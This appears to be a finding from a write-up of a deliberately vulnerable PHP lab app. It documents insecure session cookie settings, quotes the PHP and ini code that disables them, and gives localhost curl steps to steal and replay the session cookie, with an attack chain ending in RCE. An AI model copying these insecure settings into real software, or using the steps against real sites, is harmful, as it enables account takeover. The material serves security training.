# 23 — Insecure session cookie

- **OWASP Top 10 (2021):** A07:2021 – Identification and Authentication Failures
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/includes/auth.php:4-9` — session flags are forced insecure on every request:

```php
ini_set('session.cookie_httponly', 0);
ini_set('session.cookie_secure', 0);
ini_set('session.cookie_samesite', '');
ini_set('session.use_strict_mode', 0);
session_name('OSEDESESSID');
session_start();
```

`conf/php.ini:21-23` repeats the same settings:

```ini
session.cookie_httponly = 0
session.cookie_secure = 0
session.name = OSEDESESSID
```

`web/login.php:18-25` authenticates the user but never calls
`session_regenerate_id()`:

```php
$_SESSION['uid'] = $row['id'];
...
header('Location: ' . $dest);
```

## How it works (root cause)

The session cookie is set without `HttpOnly`, without `Secure`, and without
`SameSite`. JavaScript can therefore read `document.cookie`. Because the session
ID is not regenerated at login, an attacker can also fix a known session ID and
wait for the victim to use it.

## Exploitation steps

1. Log in as any user and inspect the response:

   ```bash
   curl -s -D - -o /dev/null \
     --data 'username=ulla&password=Sommar2026' \
     http://127.0.0.1:8080/login.php
   ```

2. Observe that the session cookie is readable and has no protection flags.
3. In the browser (or after any XSS, see 01/15), read it:

   ```js
   document.cookie // OSEDESESSID=...
   ```

4. Send the cookie to the attacker and replay it:

   ```bash
   curl -s -b "OSEDESESSID=<stolen-id>" http://127.0.0.1:8080/panel/index.php
   ```

## Working PoC (verified)

`POST /login.php` returns:

```http
HTTP/1.1 302 Found
Server: nginx/1.28.3
X-Powered-By: PHP/8.3.17
Set-Cookie: OSEDESESSID=2e26315b0bce150f6ae85908b0a8df72; path=/
Location: /panel/index.php
```

The cookie has **no** `HttpOnly`, **no** `Secure`, and **no** `SameSite`.

## Expected result / verification

- `document.cookie` returns the session cookie.
- The stolen cookie gives the victim's authenticated panel session.
- The adminvisit bot already demonstrates this in 15: the exfiltrated
  `OSEDESESSID` value is enough for full account takeover.

## Attack chain

```
stored XSS (01/15)
  → document.cookie is readable (no HttpOnly — this finding)
  → attacker exfiltrates OSEDESESSID
  → replays cookie → full session takeover
  → admin session → /panel/upload.php (16) → RCE
```

## Notes

- `Secure` is missing, so the cookie is also sent over plain HTTP (29).
- `SameSite` is empty, which weakens CSRF protection.
- Missing `session_regenable_id()` (sic: `session_regenerate_id()`) makes
  session fixation possible before login.
